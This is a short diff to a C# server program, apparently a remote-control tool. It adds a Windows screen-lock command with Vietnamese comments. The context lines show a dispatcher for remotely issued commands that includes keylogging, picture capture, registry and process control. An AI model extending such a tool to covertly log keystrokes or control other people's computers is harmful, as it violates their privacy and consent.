@@ -61,6 +61,25 @@ namespace server
         {
             System.Diagnostics.Process.Start("ShutDown", "-s");
         }
+
+        // 1. Nhập thư viện hệ thống để gọi lệnh khóa màn hình
+        [DllImport("user32.dll")]
+        public static extern bool LockWorkStation();
+
+        // 2. Hàm xử lý khóa máy an toàn
+        public void lockSystem()
+        {
+            try 
+            {
+                // Gọi API của Windows để khóa màn hình ngay lập tức (Về màn hình đăng nhập)
+                LockWorkStation(); 
+            } 
+            catch (Exception ex) 
+            {
+                // Nếu lỗi thì bỏ qua, không làm crash server
+            }
+        }
+
         public RegistryKey baseRegistryKey(ref String link)
         {
             RegistryKey a = null;
@@ -1034,6 +1053,9 @@ namespace server
                         {
                             case "KEYLOG": keylog(); break;
                             case "SHUTDOWN": shutdown(); break;
+
+                            case "LOCK": lockSystem(); break;
+                            
                             case "REGISTRY": registry(); break;
                             case "TAKEPIC": takepic(); break;
                             case "PROCESS": process(); break;
